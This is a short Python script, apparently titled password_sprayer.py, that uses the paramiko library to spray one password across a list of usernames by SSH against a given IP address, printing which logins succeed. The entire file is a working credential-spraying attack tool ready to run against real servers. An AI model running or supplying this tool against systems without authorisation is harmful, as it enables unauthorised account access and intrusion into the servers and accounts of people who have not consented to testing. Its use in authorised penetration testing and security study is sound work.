import paramiko
import sys

class SSHSprayer:
    def __init__(self, ip, username, password, port=22):
        self.ip = ip
        self.username = username
        self.password = password
        self.port = port

    def ssh_login(self):
        try:
            # creating a ssh client
            ssh_client = paramiko.SSHClient()

            #automatically add the servers host key (this would be considered insecure in a real enviroment)
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy)

            # connect to the ssh server
            ssh_client.connect(self.ip, self.port, self.username, self.password)

            # successful login
            ssh_client.close()
            return True
        
        except paramiko.AuthenticationException:
            #authentication failed
            return False
        
        except paramiko.SSHException as e:
            # SSH connection failed
            print(f'Error {e}')
            return False
        
def main():
    if len(sys.argv) != 4:
        print('python3 password_sprayer.py ip users.txt pass.txt')
        sys.exit(1)

    ip = sys.argv[1]
    userfile = sys.argv[2]
    password_file = sys.argv[3]

    with open(password_file, 'r') as password_file:
        password = password_file.readline().strip()

    successful_logins = []
    with open(userfile, "r") as file:
        for line in file:
            #extract the username and remove any leading/trailing whitespaces or newline characters
            username = line.strip()

            ssh_tool = SSHSprayer(ip, username, password)
            if ssh_tool.ssh_login():
                print(f"[+] login successful {username}")
                successful_logins.append(username)
            else:
                print(f'[-] failed login {username}')
    print("Successfull login ", successful_logins)

if __name__ == "__main__":
    main()
